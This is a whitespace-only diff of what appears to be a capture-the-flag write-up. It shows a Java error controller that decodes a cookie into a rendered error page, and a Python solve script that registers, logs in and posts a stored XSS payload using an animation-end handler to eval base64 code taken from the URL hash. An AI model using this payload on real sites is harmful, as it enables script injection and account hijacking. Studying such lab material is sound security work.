@@ -277,9 +277,9 @@ document.addEventListener("DOMContentLoaded", async () => {
 @Controller("/error")
 public class ExceptionController {
   private final Logger logger = LoggerFactory.getLogger(ExceptionController.class);
-  
+
   ......
-  
+
   @Get("/frontend")
   @Error(global = true)
   @View("error")
@@ -289,15 +289,15 @@ public class ExceptionController {
       detailedExceptionMessage = createDetailedExceptionMessage(request);
     } catch (Exception e) {
       return (HttpResponse<?>)HttpResponse.status(HttpStatus.INTERNAL_SERVER_ERROR);
-    } 
+    }
     this.logger.error(detailedExceptionMessage.getReferrer() + ": " + detailedExceptionMessage.getReferrer());
     return (HttpResponse<?>)HttpResponse.status(HttpStatus.INTERNAL_SERVER_ERROR)
       .body(CollectionUtils.mapOf(new Object[] { "error", detailedExceptionMessage, "detailed", Boolean.valueOf(true) }));
   }
-  
+
   private static DetailedException createDetailedExceptionMessage(HttpRequest<?> request) {
     return new DetailedException((String)request.getHeaders().get("User-Agent"), (String)request
-        .getHeaders().get("Referer"), 
+        .getHeaders().get("Referer"),
         URLDecoder.decode(request.getCookies().get("error").getValue(), StandardCharsets.UTF_8), new Date());
   }
 }
@@ -390,17 +390,17 @@ def register_and_login():
         "username": USERPASS,
         "password": USERPASS,
     }, allow_redirects=False)
-    
+
     if resp.headers['Location'] == '/auth/signin':
         log(f"Successfully registered user {USERPASS}.")
     else:
         exit()
-    
+
     resp = sess.post(CHAL_URL + "/auth/signin", data={
         "username": USERPASS,
         "password": USERPASS,
     }, allow_redirects=False)
-    
+
     if resp.headers['Location'] == '/':
         log(f"User {USERPASS} logged in.")
     else:
@@ -411,7 +411,7 @@ def send_xss_payload():
         "title": USERPASS,
         "content": '<a style="animation-name:fa-spin" onwebkitanimationend=eval(atob(location.hash.substr(1)))//',
     }, allow_redirects=False)
-    
+
     if resp.headers['Location'] == '/home':
         log(f"XSS payload sent.")
     else:
